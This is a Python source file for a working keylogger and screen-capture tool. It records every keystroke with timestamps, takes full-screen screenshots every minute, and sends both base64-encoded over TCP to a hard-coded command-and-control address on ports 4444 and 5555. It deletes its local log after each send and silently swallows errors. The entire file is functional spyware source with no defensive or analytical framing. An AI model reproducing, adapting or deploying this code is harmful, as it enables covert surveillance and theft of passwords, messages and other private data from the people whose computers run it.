import keyboard
import time
import base64
import socket
import os
import io
from PIL import ImageGrab
import threading

# =========================
# CONFIGURATION
# =========================
KEYLOG_FILE = "keylog.txt"
KEYLOG_SIZE_LIMIT = 5 * 1024  # 5 KB of RAW typing
C2_IP = "192.168.10.132"
KEYLOG_PORT = 4444
SCREENSHOT_PORT = 5555

# PLACE THE COUNTER HERE (Global Scope)
actual_typed_count = 0 

# =========================
# NETWORKING
# =========================
def send_data(data, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((C2_IP, port))
        sock.sendall(data.encode() if isinstance(data, str) else data)
        sock.close()
    except Exception:
        pass

# =========================
# KEYLOGGER LOGIC
# =========================
def keylogger():
    def on_key(event):
        global actual_typed_count
        try:
            char = event.name 
            
            # 1. Write to file (This creates the "Heavy" log with timestamps)
            with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"{char} [{time.strftime('%H:%M:%S')}]\n")

            # 2. Increment ONLY by the length of the character typed
            # This ignores the ~14 bytes of timestamp added above
            actual_typed_count += len(char)

            # 3. Trigger based on RAW count, not file size
            if actual_typed_count >= KEYLOG_SIZE_LIMIT:
                with open(KEYLOG_FILE, "rb") as f:
                    content = base64.b64encode(f.read()).decode()
                
                send_data(content, KEYLOG_PORT)
                
                # Cleanup
                if os.path.exists(KEYLOG_FILE):
                    os.remove(KEYLOG_FILE)
                actual_typed_count = 0 # Reset counter for next batch

        except Exception:
            pass
    
    keyboard.on_press(on_key)

# =========================
# SCREENSHOT LOGIC
# =========================
def screenshot_loop():
    while True:
        try:
            screenshot = ImageGrab.grab()
            img_buffer = io.BytesIO()
            screenshot.save(img_buffer, format='PNG')
            img_data = base64.b64encode(img_buffer.getvalue())
            send_data(img_data, SCREENSHOT_PORT)
        except Exception:
            pass
        time.sleep(60)

if __name__ == "__main__":
    if os.path.exists(KEYLOG_FILE):
        os.remove(KEYLOG_FILE)
    
    threading.Thread(target=screenshot_loop, daemon=True).start()
    keylogger()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        keyboard.unhook_all() 